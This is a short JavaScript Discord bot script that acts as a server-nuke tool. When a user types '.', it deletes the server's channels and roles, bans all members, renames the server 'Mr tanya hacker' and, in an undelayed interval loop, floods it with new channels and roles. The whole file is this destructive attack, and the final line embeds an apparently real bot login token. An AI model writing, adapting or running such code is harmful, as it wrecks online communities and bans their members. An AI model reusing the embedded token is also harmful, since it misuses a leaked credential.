const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Mr tanya hacker");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Mr tanya", "text");///////bo channel 
        message.guild.createChannel("Mr tanya", "voice");////bo voice
        message.guild.createRole({ name: "Mr tanya" });////nawek dane bo role kan
      });
    }
  }
});

client.login("MTAwMTk1Mjg4NTEwMzQxMTI3NA.G-6VVU.D-McZzImnygXPwyxF58C5yjg6Qd2-cEXTTwei0")
